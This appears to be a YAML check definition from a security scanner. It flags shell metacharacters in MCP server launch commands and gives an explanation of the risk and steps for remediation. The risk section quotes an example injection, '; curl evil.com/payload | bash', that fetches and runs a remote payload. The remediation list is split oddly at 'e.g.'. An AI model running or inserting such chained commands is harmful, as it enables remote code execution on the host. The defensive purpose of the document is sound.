check_id: sc013
title: Ensure server command does not contain shell metacharacters
category: supply_chain
severity: high
description: Checks for shell metacharacters in the MCP server command path or its arguments, including pipes (|), semicolons
  (;), command chaining operators (&& and ||), subshell execution via $() or backticks, and I/O redirection operators (>,
  >>, <). The presence of these characters suggests the command string is being passed through a shell interpreter rather
  than executed directly, which opens the door to command injection attacks. A malicious or compromised MCP server configuration
  containing shell metacharacters can execute arbitrary additional commands alongside or instead of the intended server binary.
  Even in non-malicious scenarios, shell metacharacters in server commands indicate poor configuration hygiene that increases
  the attack surface and makes security auditing significantly harder. This check scans both the primary command path and
  all individual arguments to ensure complete coverage of the launch configuration.
risk_explanation: 'Shell metacharacters enable an attacker to chain arbitrary commands onto the legitimate server launch command.
  For example, a command containing "; curl evil.com/payload | bash" would download and execute a remote payload alongside
  the server startup. Pipe operators can redirect server output to attacker-controlled processes, and I/O redirection can
  overwrite critical system files or exfiltrate data. When the client application passes these arguments through a shell (e.g.
  via os.system() or shell=True), the metacharacters are interpreted, allowing the injected commands to execute with the full
  privileges of the server process. This attack vector is particularly dangerous because it requires no runtime exploitation;
  the malicious commands execute at startup.

  '
remediation: '1. Remove all shell metacharacters from MCP server commands and arguments.

  2. Launch server processes using direct execution (e.g.

  3. execve, subprocess with shell=False) rather than shell invocation.

  4. If shell features are genuinely needed (e.g.

  5. for environment variable expansion), use a restricted shell or explicitly validate and escape all metacharacters before
  execution.

  6. Implement an allowlist of permitted characters in server command configurations (alphanumeric, hyphens, underscores,
  forward slashes, dots, and equals signs).

  7. Audit all server configurations regularly for newly introduced shell metacharacters.'
references:
- https://owasp.org/www-project-mcp-top-10/
